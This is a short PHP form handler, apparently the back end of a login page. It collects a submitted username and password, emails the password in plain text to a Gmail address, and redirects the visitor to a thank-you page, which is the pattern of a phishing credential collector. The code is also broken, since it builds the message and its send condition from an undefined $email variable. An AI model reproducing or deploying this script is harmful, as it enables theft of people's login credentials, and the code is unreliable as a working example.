<?php
//get data from form
$username= $_POST['username'];
$password = $_POST['password'];

$to = "kimlila000000@gmail.com";

$subject = "Mail from codeconia";
$txt ="Email = ".$email . "\r\n Password =" .$password;

$headers = "From: noreply@codeconia.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:thankyou.html");
?>